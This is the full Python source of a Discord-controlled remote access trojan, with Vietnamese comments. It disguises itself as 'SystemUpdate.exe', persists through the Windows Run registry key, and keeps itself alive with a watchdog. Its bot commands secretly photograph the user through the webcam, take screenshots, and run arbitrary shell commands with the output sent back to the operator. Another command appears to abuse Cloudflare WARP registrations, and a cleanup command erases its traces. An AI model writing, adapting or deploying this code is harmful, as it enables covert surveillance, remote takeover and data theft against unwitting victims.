import ssl, aiohttp, discord, cv2, pyautogui, subprocess, os, sys, winreg, threading, time, secrets, base64, json, urllib.request, asyncio, psutil
from discord.ext import commands

TOKEN = ""
PROCESS_NAME = "SystemUpdate.exe"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "SystemUpdateService", 0, winreg.REG_SZ, os.path.realpath(sys.executable))
        winreg.CloseKey(key)
    except: pass

def watchdog():
    # Kiểm tra số lượng tiến trình trùng lặp
    current_pid = os.getpid()
    while True:
        count = 0
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == PROCESS_NAME:
                if proc.info['pid'] != current_pid:
                    try:
                        proc.terminate() # Giết các bản sao dư thừa
                    except: pass
                count += 1
        
        if count == 0:
            try: os.startfile(sys.executable)
            except: pass
        time.sleep(10)

@bot.command()
async def chupanh(ctx):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite("c.jpg", frame)
        await ctx.send(file=discord.File("c.jpg"))
        os.remove("c.jpg")
    cam.release()

@bot.command()
async def chupmanhinh(ctx):
    pyautogui.screenshot("s.png")
    await ctx.send(file=discord.File("s.png"))
    os.remove("s.png")

@bot.command()
async def cmd(ctx, *, command):
    result = subprocess.getoutput(command)
    await ctx.send(f"```\n{result[-1900:]}\n```")

@bot.command()
async def buff(ctx, device_id: str, token: str):
    url = f"https://api.cloudflareclient.com/v0a1922/reg/{device_id}"
    data = json.dumps({"key": base64.b64encode(secrets.token_bytes(32)).decode()}).encode()
    req = urllib.request.Request(url, data=data, headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"}, method="PATCH")
    try:
        with urllib.request.urlopen(req) as r: await ctx.send("Buff thành công!")
    except Exception as e: await ctx.send(f"Lỗi: {e}")

@bot.command()
async def huy(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, "SystemUpdateService")
    except: pass
    await ctx.send("Đã xóa dấu vết.")
    os._exit(0)

async def main():
    add_to_startup()
    threading.Thread(target=watchdog, daemon=True).start()
    await bot.start(TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
